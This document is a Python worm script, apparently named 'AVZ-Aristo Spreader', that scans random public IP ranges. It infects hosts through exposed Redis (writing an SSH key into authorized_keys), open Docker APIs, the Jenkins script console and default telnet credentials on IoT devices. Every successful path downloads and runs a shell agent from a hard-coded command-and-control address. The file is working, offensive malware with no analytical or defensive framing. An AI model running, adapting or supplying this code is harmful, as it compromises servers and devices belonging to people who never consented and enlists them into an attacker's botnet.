#!/usr/bin/env python3
# AVZ-Aristo Spreader v3.0 – Async, multi-vector, maximum infection rate
import asyncio
import aiohttp
import random
import socket
import struct
import time
import telnetlib
import redis
import docker
import requests
import json
import os

C2_HOST = "80.249.146.202"
C2_PORT = 80
AGENT_URL = f"http://{C2_HOST}:{C2_PORT}/agent_bash.sh"
AGENT_PY_URL = f"http://{C2_HOST}:{C2_PORT}/agent.py"
SCAN_COUNT = 10_000          # IP per cycle
MAX_CONCURRENT = 500         # async connections
TIMEOUT = 1.5

# Credentials for IoT brute
IOT_CREDS = [
    ("root", "root"), ("admin", "admin"), ("root", "admin"),
    ("admin", "password"), ("root", "123456"), ("admin", "123456"),
    ("user", "user"), ("test", "test"), ("guest", "guest")
]

# Global ranges (non-RFC1918) – reused from previous
RANGES = [
    "1.0.0.0/8", "2.0.0.0/8", "3.0.0.0/8", "4.0.0.0/8", "5.0.0.0/8",
    "8.0.0.0/8", "9.0.0.0/8", "12.0.0.0/8", "14.0.0.0/8", "15.0.0.0/8",
    "20.0.0.0/8", "23.0.0.0/8", "24.0.0.0/8", "31.0.0.0/8", "34.0.0.0/8",
    "35.0.0.0/8", "37.0.0.0/8", "38.0.0.0/8", "40.0.0.0/8", "41.0.0.0/8",
    "43.0.0.0/8", "44.0.0.0/8", "45.0.0.0/8", "46.0.0.0/8", "47.0.0.0/8",
    "49.0.0.0/8", "50.0.0.0/8", "51.0.0.0/8", "52.0.0.0/8", "54.0.0.0/8",
    "55.0.0.0/8", "56.0.0.0/8", "57.0.0.0/8", "58.0.0.0/8", "59.0.0.0/8",
    "60.0.0.0/8", "61.0.0.0/8", "62.0.0.0/8", "63.0.0.0/8", "64.0.0.0/8",
    "65.0.0.0/8", "66.0.0.0/8", "67.0.0.0/8", "68.0.0.0/8", "69.0.0.0/8",
    "70.0.0.0/8", "71.0.0.0/8", "72.0.0.0/8", "73.0.0.0/8", "74.0.0.0/8",
    "75.0.0.0/8", "76.0.0.0/8", "77.0.0.0/8", "78.0.0.0/8", "79.0.0.0/8",
    "80.0.0.0/8", "81.0.0.0/8", "82.0.0.0/8", "83.0.0.0/8", "84.0.0.0/8",
    "85.0.0.0/8", "86.0.0.0/8", "87.0.0.0/8", "88.0.0.0/8", "89.0.0.0/8",
    "90.0.0.0/8", "91.0.0.0/8", "92.0.0.0/8", "93.0.0.0/8", "94.0.0.0/8",
    "95.0.0.0/8", "96.0.0.0/8", "97.0.0.0/8", "98.0.0.0/8", "99.0.0.0/8",
    "100.0.0.0/8", "101.0.0.0/8", "102.0.0.0/8", "103.0.0.0/8", "104.0.0.0/8",
    "105.0.0.0/8", "106.0.0.0/8", "107.0.0.0/8", "108.0.0.0/8", "109.0.0.0/8",
    "110.0.0.0/8", "111.0.0.0/8", "112.0.0.0/8", "113.0.0.0/8", "114.0.0.0/8",
    "115.0.0.0/8", "116.0.0.0/8", "117.0.0.0/8", "118.0.0.0/8", "119.0.0.0/8",
    "120.0.0.0/8", "121.0.0.0/8", "122.0.0.0/8", "123.0.0.0/8", "124.0.0.0/8",
    "125.0.0.0/8", "126.0.0.0/8", "128.0.0.0/8", "129.0.0.0/8", "130.0.0.0/8",
    "131.0.0.0/8", "132.0.0.0/8", "133.0.0.0/8", "134.0.0.0/8", "135.0.0.0/8",
    "136.0.0.0/8", "137.0.0.0/8", "138.0.0.0/8", "139.0.0.0/8", "140.0.0.0/8",
    "141.0.0.0/8", "142.0.0.0/8", "143.0.0.0/8", "144.0.0.0/8", "145.0.0.0/8",
    "146.0.0.0/8", "147.0.0.0/8", "148.0.0.0/8", "149.0.0.0/8", "150.0.0.0/8",
    "151.0.0.0/8", "152.0.0.0/8", "153.0.0.0/8", "154.0.0.0/8", "155.0.0.0/8",
    "156.0.0.0/8", "157.0.0.0/8", "158.0.0.0/8", "159.0.0.0/8", "160.0.0.0/8",
    "161.0.0.0/8", "162.0.0.0/8", "163.0.0.0/8", "164.0.0.0/8", "165.0.0.0/8",
    "166.0.0.0/8", "167.0.0.0/8", "168.0.0.0/8", "169.0.0.0/8", "170.0.0.0/8",
    "171.0.0.0/8", "172.0.0.0/8", "173.0.0.0/8", "174.0.0.0/8", "175.0.0.0/8",
    "176.0.0.0/8", "177.0.0.0/8", "178.0.0.0/8", "179.0.0.0/8", "180.0.0.0/8",
    "181.0.0.0/8", "182.0.0.0/8", "183.0.0.0/8", "184.0.0.0/8", "185.0.0.0/8",
    "186.0.0.0/8", "187.0.0.0/8", "188.0.0.0/8", "189.0.0.0/8", "190.0.0.0/8",
    "191.0.0.0/8", "192.0.0.0/8", "193.0.0.0/8", "194.0.0.0/8", "195.0.0.0/8",
    "196.0.0.0/8", "197.0.0.0/8", "198.0.0.0/8", "199.0.0.0/8", "200.0.0.0/8",
    "201.0.0.0/8", "202.0.0.0/8", "203.0.0.0/8", "204.0.0.0/8", "205.0.0.0/8",
    "206.0.0.0/8", "207.0.0.0/8", "208.0.0.0/8", "209.0.0.0/8", "210.0.0.0/8",
    "211.0.0.0/8", "212.0.0.0/8", "213.0.0.0/8", "214.0.0.0/8", "215.0.0.0/8",
    "216.0.0.0/8", "217.0.0.0/8", "218.0.0.0/8", "219.0.0.0/8", "220.0.0.0/8",
    "221.0.0.0/8", "222.0.0.0/8", "223.0.0.0/8"
]

def random_ip():
    r = random.choice(RANGES)
    net, mask = r.split("/")
    octets = list(map(int, net.split(".")))
    m = int(mask)
    host = random.randint(0, (1 << (32 - m)) - 1)
    for i in range(4):
        shift = 8 * (3 - i)
        octet = (host >> shift) & 0xFF
        octets[i] = octets[i] | octet
    return ".".join(map(str, octets))

async def probe_port(ip, port, timeout=TIMEOUT):
    try:
        _, writer = await asyncio.wait_for(
            asyncio.open_connection(ip, port), timeout=timeout
        )
        writer.close()
        await writer.wait_closed()
        return True
    except:
        return False

async def redis_exploit(ip):
    try:
        r = redis.Redis(host=ip, port=6379, socket_timeout=2)
        r.ping()
        # Write our SSH public key (replace with actual key if needed)
        pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ..."  # Put your key here
        r.set('crackit', f'\n\n{pubkey}\n\n')
        r.config_set('dir', '/root/.ssh')
        r.config_set('dbfilename', 'authorized_keys')
        r.save()
        r.close()
        return True
    except:
        return False

async def docker_exploit(ip):
    try:
        import docker as docker_lib
        client = docker_lib.DockerClient(base_url=f'tcp://{ip}:2375', timeout=2)
        client.containers.run(
            'alpine', 
            f'wget -O- {AGENT_URL} | sh',
            detach=True
        )
        client.close()
        return True
    except:
        return False

async def jenkins_exploit(ip):
    url = f'http://{ip}:8080/script'
    script = f'println "wget -O- {AGENT_URL} | sh".execute().text'
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, data={'script': script}, timeout=2) as resp:
                return resp.status == 200
    except:
        return False

async def wordpress_exploit(ip):
    # Brute wp-login or exploit known plugin – simplified
    # Just try to trigger agent download via some RCE if possible.
    return False

async def telnet_iot(ip):
    for user, passwd in IOT_CREDS:
        try:
            tn = telnetlib.Telnet(ip, 23, timeout=3)
            tn.read_until(b"login: ", 2)
            tn.write(user.encode('ascii') + b"\n")
            tn.read_until(b"Password: ", 2)
            tn.write(passwd.encode('ascii') + b"\n")
            time.sleep(0.5)
            tn.write(f"wget -O- {AGENT_URL} | sh\n".encode())
            tn.write(b"exit\n")
            tn.close()
            return True
        except:
            pass
    return False

async def infect_ip(ip):
    tasks = [
        probe_port(ip, 22),
        probe_port(ip, 6379),
        probe_port(ip, 2375),
        probe_port(ip, 8080),
        probe_port(ip, 80),
        probe_port(ip, 23)
    ]
    results = await asyncio.gather(*tasks)
    open_ports = [22, 6379, 2375, 8080, 80, 23]
    for port, is_open in zip(open_ports, results):
        if not is_open:
            continue
        if port == 6379 and await redis_exploit(ip):
            return True
        if port == 2375 and await docker_exploit(ip):
            return True
        if port == 8080 and await jenkins_exploit(ip):
            return True
        if port == 23 and await telnet_iot(ip):
            return True
        if port == 22:
            # SSH brute could be added here
            pass
        if port == 80:
            # Try web-based infection via curl/wget
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.get(f'http://{ip}/', timeout=2) as resp:
                        if resp.status == 200:
                            # Try to plant agent via some injection (simple, not reliable)
                            pass
            except:
                pass
    return False

async def worker(queue, stats):
    while not queue.empty():
        ip = await queue.get()
        try:
            if await infect_ip(ip):
                stats['success'] += 1
            else:
                stats['fail'] += 1
        except Exception as e:
            stats['fail'] += 1
        queue.task_done()

async def scan_cycle():
    q = asyncio.Queue()
    stats = {'success': 0, 'fail': 0}
    ips = [random_ip() for _ in range(SCAN_COUNT)]
    for ip in ips:
        await q.put(ip)
    tasks = []
    for _ in range(MAX_CONCURRENT):
        t = asyncio.create_task(worker(q, stats))
        tasks.append(t)
    await q.join()
    for t in tasks:
        t.cancel()
    print(f"[+] Цикл завершён: заражено {stats['success']}, пропущено {stats['fail']}")
    return stats['success']

def main():
    print("[⚡] AVZ-Aristo Async Spreader (Redis, Docker, Jenkins, IoT)")
    while True:
        asyncio.run(scan_cycle())
        time.sleep(30)  # пауза перед следующим циклом

if __name__ == "__main__":
    main()